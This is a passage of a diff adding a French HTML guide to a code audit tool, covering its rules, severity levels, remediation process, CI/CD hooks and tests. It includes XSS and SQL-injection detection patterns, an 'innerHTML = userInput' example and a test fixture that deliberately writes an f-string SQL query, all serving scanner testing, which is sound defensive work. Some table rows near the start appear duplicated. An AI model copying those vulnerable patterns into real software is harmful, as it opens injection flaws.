+            </tr>
+
+            <tr>
+                <td>Style inline JS</td>
+                <td><code>.style.property =</code></td>
+                <td class="severity-low">LOW</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>SVG inline</td>
+                <td><code>&lt;svg</code> au lieu de <code>Icons.</code></td>
+                <td class="severity-low">LOW</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>createElement manuel</td>
+                <td><code>document.createElement</code></td>
+                <td class="severity-low">LOW</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+        </tbody>
+    </table>
+            <tr>
+                <td>Style inline JS</td>
+                <td><code>.style.property =</code> dans JS</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>SVG inline</td>
+                <td><code>&lt;svg</code> dans HTML au lieu de <code>Icons.</code></td>
+                <td class="severity-low">LOW</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>createElement manuel</td>
+                <td><code>document.createElement</code> au lieu de Templates</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>Event listener orphelin</td>
+                <td><code>addEventListener</code> sans <code>removeEventListener</code></td>
+                <td class="severity-low">LOW</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+            <tr>
+                <td>DOM dans boucle</td>
+                <td><code>appendChild</code> ou <code>innerHTML</code> dans for/while</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <!-- ===== UX & MAINTENANCE RULES ===== -->
+    <h3><span class="h3-dot dot-green"></span> UX &amp; Maintenance</h3>
+
+    <div class="callout callout-info" style="margin-bottom: 1rem;">
+        <span class="callout-icon">&#x1F514;</span>
+        <span>Les probl&egrave;mes UX/Maintenance entra&icirc;nent : <strong>utilisateurs frustr&eacute;s</strong>, <strong>support accru</strong>, <strong>dette technique</strong>, et <strong>difficult&eacute; d'onboarding</strong> des nouveaux d&eacute;veloppeurs.</span>
+    </div>
+
+    <table>
+        <thead><tr><th>R&egrave;gle</th><th>Pattern</th><th>Grav.</th><th>Impl.</th></tr></thead>
+        <tbody>
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Toast Non Traduit</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>showToast("Message hardcod&eacute;")</code> sans <code>t('cle')</code><br>
+                    <strong>Pourquoi :</strong> Les textes hardcod&eacute;s :<br>
+                    &bull; <strong>Cassent l'i18n</strong> (utilisateurs non-francophones voient du fran&ccedil;ais)<br>
+                    &bull; <strong>Compliquent les modifications</strong> (chercher dans tout le code)<br>
+                    &bull; <strong>Cr&eacute;ent des incoh&eacute;rences</strong> (m&ecirc;me message formul&eacute; diff&eacute;remment)<br>
+                    <strong>Solution :</strong> <code>showToast(t('document.saved'), 'success')</code>
+                </td>
+            </tr>
+            <tr>
+                <td>Toast non traduit</td>
+                <td><code>showToast(</code> sans <code>t(</code></td>
+                <td class="severity-medium">MEDIUM</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Toast Erreur &Eacute;ph&eacute;m&egrave;re</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>showToast(..., 'error')</code> sans <code>duration: 0</code><br>
+                    <strong>Pourquoi :</strong> Une erreur qui dispara&icirc;t apr&egrave;s 3 secondes :<br>
+                    &bull; <strong>Frustre l'utilisateur</strong> (pas le temps de lire)<br>
+                    &bull; <strong>Emp&ecirc;che le diagnostic</strong> (quelle erreur exactement ?)<br>
+                    &bull; <strong>G&eacute;n&egrave;re du support</strong> ("&ccedil;a ne marche pas" sans d&eacute;tails)<br>
+                    <strong>Solution :</strong> <code>showToast(t('error.upload'), 'error', 0)</code> &mdash; l'utilisateur ferme manuellement
+                </td>
+            </tr>
+            <tr>
+                <td>Toast erreur &eacute;ph&eacute;m&egrave;re</td>
+                <td><code>'error'</code> sans <code>0)</code></td>
+                <td class="severity-medium">MEDIUM</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">console.log R&eacute;siduel</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>console.log()</code> hors fichiers debug<br>
+                    <strong>Pourquoi :</strong> Les logs de d&eacute;veloppement en production :<br>
+                    &bull; <strong>Polluent la console</strong> (difficile de trouver les vrais probl&egrave;mes)<br>
+                    &bull; <strong>Exposent des informations</strong> (structure donn&eacute;es, tokens parfois)<br>
+                    &bull; <strong>Image non professionnelle</strong> (les utilisateurs voient la console)<br>
+                    <strong>Solution :</strong> Supprimer ou conditionner avec <code>if (DEBUG)</code>
+                </td>
+            </tr>
+            <tr>
+                <td>console.log r&eacute;siduel</td>
+                <td><code>console.log(</code></td>
+                <td class="severity-low">LOW</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">TODO / FIXME Non R&eacute;solu</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>// TODO</code>, <code># FIXME</code>, <code>HACK</code>, <code>XXX</code><br>
+                    <strong>Pourquoi :</strong> Les TODO oubli&eacute;s :<br>
+                    &bull; <strong>S'accumulent</strong> (dette technique invisible)<br>
+                    &bull; <strong>Perdent leur contexte</strong> (l'auteur a oubli&eacute; pourquoi)<br>
+                    &bull; <strong>Signalent du code incomplet</strong> (bugs potentiels)<br>
+                    &bull; <strong>FIXME/HACK</strong> = probl&egrave;me connu non corrig&eacute;<br>
+                    <strong>Solution :</strong> Cr&eacute;er un ticket et r&eacute;f&eacute;rencer, ou corriger imm&eacute;diatement
+                </td>
+            </tr>
+            <tr>
+                <td>TODO/FIXME</td>
+                <td><code>TODO|FIXME|HACK|XXX</code></td>
+                <td class="severity-low">LOW</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">ARIA Manquant</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>&lt;button&gt;</code> ou <code>&lt;input&gt;</code> sans <code>aria-label</code><br>
+                    <strong>Pourquoi :</strong> Les attributs ARIA sont essentiels pour :<br>
+                    &bull; <strong>Lecteurs d'&eacute;cran</strong> (utilisateurs malvoyants)<br>
+                    &bull; <strong>Navigation clavier</strong> (contexte des &eacute;l&eacute;ments)<br>
+                    &bull; <strong>Conformit&eacute; l&eacute;gale</strong> (RGAA, WCAG 2.1 AA obligatoire secteur public)<br>
+                    <strong>Exemple :</strong> <code>&lt;button aria-label="Fermer la fen&ecirc;tre"&gt;&times;&lt;/button&gt;</code>
+                </td>
+            </tr>
+            <tr>
+                <td>ARIA manquant</td>
+                <td>Boutons/inputs sans <code>aria-label</code></td>
+                <td class="severity-medium">MEDIUM</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Route API Orpheline</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> Route d&eacute;finie c&ocirc;t&eacute; backend mais jamais appel&eacute;e c&ocirc;t&eacute; frontend<br>
+                    <strong>Pourquoi :</strong> Les routes orphelines :<br>
+                    &bull; <strong>Augmentent la surface d'attaque</strong> (endpoints oubli&eacute;s, moins test&eacute;s)<br>
+                    &bull; <strong>Compliquent la maintenance</strong> (est-ce utilis&eacute; ? par qui ?)<br>
+                    &bull; <strong>Alourdissent la documentation</strong> (API plus grande que n&eacute;cessaire)<br>
+                    <strong>Solution :</strong> Supprimer ou documenter l'usage pr&eacute;vu
+                </td>
+            </tr>
+            <tr>
+                <td>Route orpheline</td>
+                <td>Route non appel&eacute;e dans frontend</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Import Inutilis&eacute;</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>from module import X</code> o&ugrave; X n'est jamais utilis&eacute;<br>
+                    <strong>Pourquoi :</strong> Les imports inutilis&eacute;s :<br>
+                    &bull; <strong>Ralentissent le d&eacute;marrage</strong> (chargement de modules inutiles)<br>
+                    &bull; <strong>Cr&eacute;ent de la confusion</strong> (ce module est-il n&eacute;cessaire ?)<br>
+                    &bull; <strong>Peuvent causer des erreurs</strong> (si le module import&eacute; est supprim&eacute;)<br>
+                    <strong>Outils :</strong> <code>autoflake</code>, <code>ruff --fix</code>
+                </td>
+            </tr>
+            <tr>
+                <td>Import inutilis&eacute;</td>
+                <td>Import non utilis&eacute;</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Fichier Vide / Mort</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> Fichier &lt; 10 lignes, ou fichier jamais import&eacute;<br>
+                    <strong>Pourquoi :</strong> Les fichiers morts :<br>
+                    &bull; <strong>Encombrent l'arborescence</strong> (bruit visuel, recherche pollu&eacute;e)<br>
+                    &bull; <strong>Cr&eacute;ent de la confusion</strong> (ce fichier sert-il encore ?)<br>
+                    &bull; <strong>Augmentent la taille du d&eacute;p&ocirc;t</strong> (git history, backups)<br>
+                    <strong>Solution :</strong> Supprimer ou documenter l'usage futur
+                </td>
+            </tr>
+            <tr>
+                <td>Fichier vide/mort</td>
+                <td>Fichier &lt; 10 lignes ou non import&eacute;</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ==================== SECTION 5 ==================== -->
+<div class="section" id="s5">
+    <div class="section-header">
+        <div class="section-icon icon-amber">&#x26A0;&#xFE0F;</div>
+        <div><h2>Niveaux de Gravit&eacute; <span class="section-num">&mdash; Section 5</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <div class="cards">
+        <div class="card" style="border-left: 5px solid var(--danger);">
+            <div class="card-title"><span class="severity-high">HIGH</span> &mdash; Critique</div>
+            <div class="card-text">
+                <strong>Impact :</strong> Compromission syst&egrave;me, fuite de donn&eacute;es, ex&eacute;cution de code<br>
+                <strong>D&eacute;lai correction :</strong> Imm&eacute;diat (24-48h)<br>
+                <strong>Exemples :</strong> SQL Injection, XSS, secrets expos&eacute;s
+            </div>
+        </div>
+        <div class="card" style="border-left: 5px solid var(--warning);">
+            <div class="card-title"><span class="severity-medium">MEDIUM</span> &mdash; Important</div>
+            <div class="card-text">
+                <strong>Impact :</strong> D&eacute;gradation qualit&eacute;, dette technique, maintenance difficile<br>
+                <strong>D&eacute;lai correction :</strong> Sprint suivant (1-2 semaines)<br>
+                <strong>Exemples :</strong> Logique DB dans router, toasts non traduits
+            </div>
+        </div>
+        <div class="card" style="border-left: 5px solid var(--info);">
+            <div class="card-title"><span class="severity-low">LOW</span> &mdash; Mineur</div>
+            <div class="card-text">
+                <strong>Impact :</strong> Incoh&eacute;rence, non-respect conventions, code mort<br>
+                <strong>D&eacute;lai correction :</strong> Backlog (1-3 mois)<br>
+                <strong>Exemples :</strong> innerHTML, routes orphelines, TODO non r&eacute;solus
+            </div>
+        </div>
+    </div>
+
+    <h3><span class="h3-dot dot-teal"></span> Calcul du score de sant&eacute;</h3>
+    <div class="callout callout-info">
+        <span class="callout-icon">&#x1F4CA;</span>
+        <span>
+            <strong>Formule :</strong> <code>Sant&eacute; = (Succ&egrave;s / (Succ&egrave;s + &Eacute;checs)) &times; 100</code><br>
+            <strong>Objectif :</strong> &gt; 90% sur toutes les cat&eacute;gories<br>
+            <strong>Seuil alerte :</strong> &lt; 70% d&eacute;clenche une revue obligatoire
+        </span>
+    </div>
+</div>
+
+<!-- ==================== SECTION 6 ==================== -->
+<div class="section" id="s6">
+    <div class="section-header">
+        <div class="section-icon icon-green">&#x1F4CA;</div>
+        <div><h2>M&eacute;triques &amp; KPIs <span class="section-num">&mdash; Section 6</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <h3><span class="h3-dot dot-green"></span> Indicateurs suivis</h3>
+    <div class="cards">
+        <div class="card metric-card">
+            <div class="metric-value">0</div>
+            <div class="metric-label">Vuln&eacute;rabilit&eacute;s HIGH</div>
+        </div>
+        <div class="card metric-card">
+            <div class="metric-value">&gt;90%</div>
+            <div class="metric-label">Score Sant&eacute; Global</div>
+        </div>
+        <div class="card metric-card">
+            <div class="metric-value">100%</div>
+            <div class="metric-label">Couverture i18n</div>
+        </div>
+        <div class="card metric-card">
+            <div class="metric-value">0</div>
+            <div class="metric-label">Routes Orphelines</div>
+        </div>
+    </div>
+
+    <h3><span class="h3-dot dot-blue"></span> Fr&eacute;quence des audits</h3>
+    <table>
+        <thead><tr><th>Type</th><th>Fr&eacute;quence</th><th>D&eacute;clencheur</th></tr></thead>
+        <tbody>
+            <tr><td>Audit complet</td><td>Hebdomadaire</td><td>Cron ou manuel</td></tr>
+            <tr><td>Audit rapide (s&eacute;curit&eacute;)</td><td>Quotidien</td><td>CI/CD sur push</td></tr>
+            <tr><td>Audit pr&eacute;-d&eacute;ploiement</td><td>Chaque release</td><td>Avant merge main</td></tr>
+            <tr><td>Audit post-incident</td><td>Ad-hoc</td><td>Apr&egrave;s incident s&eacute;curit&eacute;</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ==================== SECTION 7 ==================== -->
+<div class="section" id="s7">
+    <div class="section-header">
+        <div class="section-icon icon-blue">&#x1F4A1;</div>
+        <div><h2>Structure des Recommandations <span class="section-num">&mdash; Section 7</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <p>Chaque recommandation suit le format <strong>Risque &rarr; Solution &rarr; B&eacute;n&eacute;fice</strong> :</p>
+
+    <div class="vflow">
+        <div class="vflow-step active">
+            <div class="step-title">&#x1F534; Quel est le risque ?</div>
+            <div class="step-desc">Expliquer l'impact concret d'une non-correction (faille exploit&eacute;e, bug utilisateur, dette technique)</div>
+        </div>
+        <div class="vflow-step active">
+            <div class="step-title">&#x1F6E0;&#xFE0F; Quelle est la solution ?</div>
+            <div class="step-desc">D&eacute;crire l'action technique pr&eacute;cise avec exemple de code si pertinent</div>
+        </div>
+        <div class="vflow-step active">
+            <div class="step-title">&#x2705; Quel est le b&eacute;n&eacute;fice ?</div>
+            <div class="step-desc">Quantifier l'am&eacute;lioration : s&eacute;curit&eacute; renforc&eacute;e, maintenance simplifi&eacute;e, performances accrues</div>
+        </div>
+    </div>
+
+    <h3><span class="h3-dot dot-teal"></span> Exemple de recommandation</h3>
+    <div class="callout callout-warning">
+        <span class="callout-icon">&#x26A0;&#xFE0F;</span>
+        <span>
+            <strong>Probl&egrave;me :</strong> <code>innerHTML = userInput</code> dans <code>UI-FRONT/js/chat.js</code><br><br>
+            <strong>&#x1F534; Risque :</strong> Un attaquant peut injecter du JavaScript malveillant via le chat, volant les tokens JWT ou ex&eacute;cutant des actions au nom de l'utilisateur.<br><br>
+            <strong>&#x1F6E0;&#xFE0F; Solution :</strong> Utiliser <code>Templates.render('message', {content: userInput})</code> qui &eacute;chappe automatiquement le HTML.<br><br>
+            <strong>&#x2705; B&eacute;n&eacute;fice :</strong> Immunit&eacute; contre les attaques XSS, conformit&eacute; OWASP A03.
+        </span>
+    </div>
+</div>
+
+<!-- ==================== SECTION 8 ==================== -->
+<div class="section" id="s8">
+    <div class="section-header">
+        <div class="section-icon icon-teal">&#x1F504;</div>
+        <div><h2>Processus de Rem&eacute;diation <span class="section-num">&mdash; Section 8</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <div class="vflow">
+        <div class="vflow-step">
+            <div class="step-title">1. G&eacute;n&eacute;ration du rapport</div>
+            <div class="step-desc"><code>python scripts/test/run_audit.py</code></div>
+        </div>
+        <div class="vflow-step">
+            <div class="step-title">2. Triage par gravit&eacute;</div>
+            <div class="step-desc">HIGH en premier, puis MEDIUM, puis LOW</div>
+        </div>
+        <div class="vflow-step">
+            <div class="step-title">3. Cr&eacute;ation des tickets</div>
+            <div class="step-desc">1 ticket par probl&egrave;me avec r&eacute;f&eacute;rence au rapport</div>
+        </div>
+        <div class="vflow-step">
+            <div class="step-title">4. Correction &amp; Review</div>
+            <div class="step-desc">PR avec tests de non-r&eacute;gression</div>
+        </div>
+        <div class="vflow-step active">
+            <div class="step-title">5. V&eacute;rification</div>
+            <div class="step-desc">Re-run audit pour confirmer correction</div>
+        </div>
+    </div>
+
+    <h3><span class="h3-dot dot-amber"></span> SLA par gravit&eacute;</h3>
+    <table>
+        <thead><tr><th>Gravit&eacute;</th><th>D&eacute;lai max</th><th>Escalade si non corrig&eacute;</th></tr></thead>
+        <tbody>
+            <tr><td class="severity-high">HIGH</td><td>48 heures</td><td>CTO / Responsable S&eacute;curit&eacute;</td></tr>
+            <tr><td class="severity-medium">MEDIUM</td><td>2 semaines</td><td>Tech Lead</td></tr>
+            <tr><td class="severity-low">LOW</td><td>3 mois</td><td>Revue trimestrielle</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ==================== SECTION 9 ==================== -->
+<div class="section" id="s9">
+    <div class="section-header">
+        <div class="section-icon icon-purple">&#x2699;&#xFE0F;</div>
+        <div><h2>Int&eacute;gration CI/CD <span class="section-num">&mdash; Section 9</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <h3><span class="h3-dot dot-purple"></span> GitHub Actions (exemple)</h3>
+    <pre><code># .github/workflows/audit.yml
+name: Security Audit
+
+on:
+  push:
+    branches: [main, dev]
+  schedule:
+    - cron: '0 6 * * 1'  # Chaque lundi 6h
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Run audit
+        run: python scripts/test/run_audit.py
+
+      - name: Check HIGH vulnerabilities
+        run: |
+          if grep -q '"crit": "HIGH"' docs/audit-reports/AUDIT-REPORT-*.html; then
+            echo "::error::HIGH severity issues found!"
+            exit 1
+          fi
+
+      - name: Upload report
+        uses: actions/upload-artifact@v4
+        with:
+          name: audit-report
+          path: docs/audit-reports/</code></pre>
+
+    <h3><span class="h3-dot dot-teal"></span> Pre-commit hook (local)</h3>
+    <pre><code># .git/hooks/pre-commit
+#!/bin/bash
+python scripts/test/run_audit.py --quick --fail-on-high</code></pre>
+</div>
+
+<!-- ==================== SECTION 10 ==================== -->
+<div class="section" id="s10">
+    <div class="section-header">
+        <div class="section-icon icon-green">&#x2696;&#xFE0F;</div>
+        <div><h2>Conformit&eacute;s Additionnelles <span class="section-num">&mdash; Section 10</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <h3><span class="h3-dot dot-green"></span> RGPD (Donn&eacute;es personnelles)</h3>
+    <table class="check-matrix">
+        <thead><tr><th>Exigence</th><th>Impl&eacute;ment&eacute;</th><th>V&eacute;rification</th></tr></thead>
+        <tbody>
+            <tr><td>Consentement utilisateur</td><td class="check-yes">&#x2705;</td><td>Modal CGU au signup</td></tr>
+            <tr><td>Droit &agrave; l'effacement</td><td class="check-yes">&#x2705;</td><td>Endpoint DELETE /users/me</td></tr>
+            <tr><td>Export des donn&eacute;es</td><td class="check-no">&#x274C;</td><td>&Agrave; impl&eacute;menter</td></tr>
+            <tr><td>Chiffrement au repos</td><td class="check-yes">&#x2705;</td><td>PostgreSQL + TLS</td></tr>
+            <tr><td>Logs anonymis&eacute;s</td><td class="check-yes">&#x2705;</td><td>Pas d'IP en clair</td></tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-blue"></span> Accessibilit&eacute; (WCAG 2.1 AA)</h3>
+    <table class="check-matrix">
+        <thead><tr><th>Crit&egrave;re</th><th>Impl&eacute;ment&eacute;</th><th>V&eacute;rification</th></tr></thead>
+        <tbody>
+            <tr><td>Contraste couleurs (4.5:1)</td><td class="check-yes">&#x2705;</td><td>Variables CSS</td></tr>
+            <tr><td>Navigation clavier</td><td>&#x1F7E1;</td><td>Partiel (focus visible)</td></tr>
+            <tr><td>Labels ARIA</td><td class="check-no">&#x274C;</td><td>&Agrave; am&eacute;liorer</td></tr>
+            <tr><td>Textes alternatifs</td><td class="check-yes">&#x2705;</td><td>Icons avec title</td></tr>
+            <tr><td>Skip links</td><td class="check-no">&#x274C;</td><td>&Agrave; impl&eacute;menter</td></tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-amber"></span> Internationalisation (i18n)</h3>
+    <table class="check-matrix">
+        <thead><tr><th>Crit&egrave;re</th><th>Impl&eacute;ment&eacute;</th><th>V&eacute;rification</th></tr></thead>
+        <tbody>
+            <tr><td>Pas de texte hardcod&eacute;</td><td class="check-yes">&#x2705;</td><td>Audit automatique</td></tr>
+            <tr><td>Fichiers locales (fr, en)</td><td class="check-yes">&#x2705;</td><td>UI-SHARED/locales/</td></tr>
+            <tr><td>Dates localis&eacute;es</td><td class="check-yes">&#x2705;</td><td>Intl.DateTimeFormat</td></tr>
+            <tr><td>RTL support</td><td class="check-no">&#x274C;</td><td>Non pr&eacute;vu</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ==================== SECTION 11 ==================== -->
+<div class="section" id="s11">
+    <div class="section-header">
+        <div class="section-icon icon-teal">&#x1F9EA;</div>
+        <div><h2>Tests d'Audit <span class="section-num">&mdash; Section 11</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <h3><span class="h3-dot dot-teal"></span> Objectifs des tests</h3>
+    <div class="cards">
+        <div class="card">
+            <div class="card-title">&#x2705; Vrais Positifs</div>
+            <div class="card-text">
+                V&eacute;rifier que chaque r&egrave;gle d&eacute;tecte correctement les vuln&eacute;rabilit&eacute;s connues
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x274C; Faux Positifs</div>
+            <div class="card-text">
+                S'assurer que le code sain ne d&eacute;clenche pas d'alertes inutiles
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x26A0;&#xFE0F; Faux N&eacute;gatifs</div>
+            <div class="card-text">
+                Tester les variantes de failles pour &eacute;viter les contournements
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x1F504; R&eacute;gression</div>
+            <div class="card-text">
+                Garantir qu'une r&egrave;gle modifi&eacute;e continue de d&eacute;tecter les anciens cas
+            </div>
+        </div>
+    </div>
+
+    <h3><span class="h3-dot dot-blue"></span> Structure des tests</h3>
+    <pre><code>tests/
+└── audit/
+    ├── conftest.py              # Fixtures pytest communes
+    ├── fixtures/
+    │   ├── vulnerable/          # Code avec failles (DOIT d&eacute;tecter)
+    │   │   ├── sql_injection.py
+    │   │   ├── xss_innerhtml.js
+    │   │   ├── hardcoded_secret.py
+    │   │   ├── csrf_missing.html
+    │   │   └── debug_mode.py
+    │   └── clean/               # Code sain (NE DOIT PAS d&eacute;tecter)
+    │       ├── safe_sql.py
+    │       ├── safe_innerhtml.js
+    │       └── env_secret.py
+    ├── test_security_rules.py   # Tests r&egrave;gles SECURITY
+    ├── test_arch_rules.py       # Tests r&egrave;gles ARCH
+    ├── test_ui_rules.py         # Tests r&egrave;gles UI
+    ├── test_ux_rules.py         # Tests r&egrave;gles UX
+    ├── test_maintenance_rules.py
+    ├── test_report_generation.py
+    └── test_comparison.py</code></pre>
+
+    <h3><span class="h3-dot dot-green"></span> Exemple de test unitaire</h3>
+    <pre><code># tests/audit/test_security_rules.py
+import pytest
+from scripts.test.run_audit import AuditRunner
+
+class TestSQLInjection:
+    def test_detects_fstring_in_execute(self, tmp_path):
+        """Doit d&eacute;tecter f-string dans execute()"""
+        vuln_file = tmp_path / "app" / "bad.py"
+        vuln_file.parent.mkdir(parents=True)
+        vuln_file.write_text('db.execute(f"SELECT * FROM users WHERE id={user_id}")')
+
+        runner = AuditRunner(root_dir=str(tmp_path))
+        runner._audit_security()
+
+        findings = runner.categories["SECURITY"].findings
+        assert len(findings) == 1
+        assert findings[0].rule == "SQL Injection (f-string)"
+        assert findings[0].severity == "HIGH"
+
+    def test_ignores_parameterized_query(self, tmp_path):
+        """Ne doit PAS d&eacute;tecter les requ&ecirc;tes param&eacute;tr&eacute;es"""
+        safe_file = tmp_path / "app" / "good.py"
+        safe_file.parent.mkdir(parents=True)
+        safe_file.write_text('db.execute(text("SELECT * WHERE id=:id"), {"id": uid})')
+
+        runner = AuditRunner(root_dir=str(tmp_path))
+        runner._audit_security()
+
+        assert len(runner.categories["SECURITY"].findings) == 0</code></pre>
+
+    <h3><span class="h3-dot dot-amber"></span> Matrice de couverture</h3>
+    <table class="check-matrix">
+        <thead>
+            <tr><th>R&egrave;gle</th><th>Vrai +</th><th>Faux +</th><th>Variantes</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>SQL Injection f-string</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>SQL Injection concat</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>XSS innerHTML</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>Secrets hardcod&eacute;s</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>Routes admin</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td><td>&#x2014;</td></tr>
+            <tr><td>DB dans router</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td><td>&#x2014;</td></tr>
+            <tr><td>Toast non traduit</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td><td class="check-yes">&#x2705;</td></tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-purple"></span> Ex&eacute;cution des tests</h3>
+    <pre><code># Tous les tests audit
+docker-compose exec app python -m pytest tests/audit/ -v
+
+# Tests s&eacute;curit&eacute; uniquement
+docker-compose exec app python -m pytest tests/audit/test_security_rules.py -v
+
+# Avec couverture
+docker-compose exec app python -m pytest tests/audit/ --cov=scripts/test/run_audit</code></pre>
+</div>
+
+<!-- ==================== SECTION 12 ==================== -->
+<div class="section" id="s12">
+    <div class="section-header">
+        <div class="section-icon icon-blue">&#x1F4CA;</div>
+        <div><h2>Graphiques &amp; Visualisation <span class="section-num">&mdash; Section 12</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <h3><span class="h3-dot dot-blue"></span> Graphiques inclus dans le rapport</h3>
+    <div class="cards">
+        <div class="card">
+            <div class="card-title">&#x1F4CA; Pie Chart &mdash; R&eacute;partition Gravit&eacute;</div>
+            <div class="card-text">
+                Visualisation HIGH / MEDIUM / LOW en pourcentages<br>
+                <strong>Lib :</strong> Chart.js (inline, pas de CDN)
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x1F4CA; Bar Chart &mdash; Par Cat&eacute;gorie</div>
+            <div class="card-text">
+                Nombre de findings par cat&eacute;gorie (SECURITY, ARCH, UI, UX, MAINTENANCE)
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x1F4C8; Trend Line &mdash; &Eacute;volution</div>
+            <div class="card-text">
+                Courbe des findings sur les N derniers audits<br>
+                <strong>Requis :</strong> Historique JSON
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x1F5FA;&#xFE0F; Heatmap &mdash; Fichiers</div>
+            <div class="card-text">
+                Top 10 fichiers les plus probl&eacute;matiques<br>
+                Couleur selon nombre de findings
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x1F3AF; Gauge &mdash; Score Sant&eacute;</div>
+            <div class="card-text">
+                Jauge visuelle 0-100% avec zones vert/orange/rouge<br>
+                <strong>Lib :</strong> SVG inline
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x1F4E6; Stacked Bar &mdash; Code/D&eacute;ps</div>
+            <div class="card-text">
+                R&eacute;partition Code m&eacute;tier vs D&eacute;pendances par gravit&eacute;
+            </div>
+        </div>
+    </div>
+
+    <h3><span class="h3-dot dot-green"></span> Impl&eacute;mentation Chart.js</h3>
+    <pre><code>// Inclus inline dans le rapport HTML (pas de CDN externe)
+&lt;script&gt;
+// Chart.js minifi&eacute; (~60KB)
+// ...
+
+// Donn&eacute;es inject&eacute;es par Python
+const chartData = {
+    severity: { HIGH: 43, MEDIUM: 120, LOW: 182 },
+    categories: {
+        SECURITY: 43,
+        ARCH: 25,
+        UI: 89,
+        UX: 56,
+        MAINTENANCE: 132
+    },
+    codeVsDeps: {
+        business: 320,
+        dependencies: 25
+    }
+};
